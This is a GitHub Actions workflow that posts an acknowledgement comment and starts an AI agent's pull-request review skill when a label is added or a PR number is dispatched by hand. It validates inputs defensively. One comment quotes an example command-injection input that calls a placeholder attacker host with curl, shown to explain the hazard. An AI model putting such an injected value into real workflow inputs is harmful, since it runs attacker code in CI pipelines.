# Triggers the pr-review-and-merge skill on a PR.
#
# Two ways to invoke:
#   1. Add the `agent-review` label to a PR.
#   2. Manual workflow dispatch with a PR number.
#
# This workflow's job is to make the trigger DETERMINISTIC. The skill's
# discoverability via `tool_search` keyword matching has a failure mode:
# if the next session's opening prompt doesn't contain the right
# trigger phrases, the agent skips the skill entirely. A label-driven
# workflow removes that ambiguity — when the label is on the PR, the
# review runs.
#
# IMPORTANT: the actual agent-runner invocation step is environment-
# specific. This file ships the trigger plumbing; the integration step
# below has placeholders for the three common patterns. Pick one and
# delete the others before merging.
#
# Reference: .agents/skills/pr-review-and-merge/SKILL.md

name: agent-review

on:
  pull_request:
    types: [labeled]
  workflow_dispatch:
    inputs:
      pr_number:
        description: 'PR number to review'
        required: true
        type: string

permissions:
  pull-requests: write
  contents: read
  issues: write

jobs:
  trigger-review:
    # On `pull_request` event, only run when the label being added is
    # `agent-review`. On `workflow_dispatch`, always run.
    if: >-
      github.event_name == 'workflow_dispatch' ||
      (github.event_name == 'pull_request' && github.event.label.name == 'agent-review')
    runs-on: ubuntu-latest

    steps:
      - name: Resolve PR number
        id: pr
        # Pass user-controlled inputs through `env` and reference them
        # as shell variables — never interpolate `${{ ... }}` directly
        # into a `run:` block, which would let a hostile workflow_dispatch
        # input like `1"; curl evil.example.com; echo "` execute as code.
        env:
          INPUT_PR_NUMBER: ${{ github.event.inputs.pr_number }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
          EVENT_NAME: ${{ github.event_name }}
        run: |
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            # Defense-in-depth: even though the input is now passed
            # through env (no direct `${{ }}` interpolation), reject any
            # value that isn't purely numeric. A non-numeric input would
            # have to be a deliberate misuse — fail loud rather than
            # propagate it to downstream `gh pr comment` calls.
            case "$INPUT_PR_NUMBER" in
              ''|*[!0-9]*)
                echo "::error::Input pr_number must be a numeric PR id"
                exit 1
                ;;
            esac
            echo "number=$INPUT_PR_NUMBER" >> "$GITHUB_OUTPUT"
          else
            echo "number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
          fi

      - name: Acknowledge trigger
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PR_NUMBER: ${{ steps.pr.outputs.number }}
          REPO: ${{ github.repository }}
        run: |
          gh pr comment "$PR_NUMBER" \
            --repo "$REPO" \
            --body "🤖 \`agent-review\` triggered. Running the [\`pr-review-and-merge\` skill](.agents/skills/pr-review-and-merge/SKILL.md) — phase 0 (preconditions) → 7 (follow-up). Status comments will appear inline as each phase completes."

      # ────────────────────────────────────────────────────────────────
      # PICK ONE of the three integration patterns below and delete the
      # others. The workflow is non-functional until one is enabled.
      # ────────────────────────────────────────────────────────────────

      # ── Pattern A: Anthropic claude-code-action (recommended) ──
      # Requires repo secret: ANTHROPIC_API_KEY
      # Docs: https://github.com/anthropics/claude-code-action
